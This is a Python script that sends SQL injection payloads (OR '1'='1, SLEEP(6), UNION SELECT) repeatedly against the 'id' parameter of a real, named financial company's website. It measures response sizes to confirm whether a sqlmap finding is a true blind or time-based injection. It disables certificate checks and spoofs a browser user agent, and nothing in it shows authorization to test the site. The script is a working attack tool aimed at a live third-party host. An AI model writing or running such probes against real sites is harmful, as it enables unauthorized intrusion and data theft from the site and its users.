#!/usr/bin/env python3
"""FP verification: is sqlmap's 'id is MySQL-injectable' real, or Vercel challenge noise?
Interleave TRUE/FALSE/BASELINE many times. Real blind SQLi => stable separation.
Rotating challenge token => noise.
"""
import urllib.request, urllib.parse, ssl, statistics, collections
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36"
B = "https://www.infinitycapital.bh/"

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent":UA}), timeout=25, context=ctx)
        return r.getcode(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()

CASES = {
  "BASELINE"   : "1",
  "OR_TRUE"    : "1' OR '1'='1",
  "OR_FALSE"   : "1' OR '1'='2",
  "SLEEP"      : "1' AND SLEEP(6)-- -",
  "UNION"      : "1' UNION SELECT 1,2,3,4,5,6,7,8-- -",
}
N = 8
res = collections.defaultdict(list)
codes = collections.defaultdict(list)
for rnd in range(N):
    for name, val in CASES.items():
        url = B + "?" + urllib.parse.urlencode({"id": val, "search":"test", "page":"2"})
        c, b = get(url)
        codes[name].append(c)
        res[name].append(len(b))

print("case          codes          n  min   max   mean   stdev")
for name in CASES:
    L = res[name]
    sd = statistics.pstdev(L) if len(L) > 1 else 0
    print(f"{name:12s} {set(codes[name])}  {len(L)}  {min(L):5d} {max(L):5d} {statistics.mean(L):7.1f} {sd:6.1f}")

print()
print("VERDICT CHECK:")
t = res["OR_TRUE"]; f = res["OR_FALSE"]
dt = abs(statistics.mean(t) - statistics.mean(f))
pooled = max(statistics.pstdev(t) or 1, statistics.pstdev(f) or 1)
print(f"  mean(TRUE)-mean(FALSE) = {dt:.1f} bytes ; pooled within-class stdev = {pooled:.1f}")
print(f"  separation ratio = {dt/pooled:.2f}  (>>2 = likely real; <2 = indistinguishable => challenge noise)")
print(f"  all responses HTTP: {set(c for cs in codes.values() for c in cs)}")
print(f"  min/max TRUE={min(t)}/{max(t)}  FALSE={min(f)}/{max(f)}")
c, b = get(B + "?" + urllib.parse.urlencode({"id": CASES["SLEEP"], "search":"t","page":"2"}))
print(f"  SLEEP -> code={c} size={len(b)} (6s delay => real time-based SQLi)")
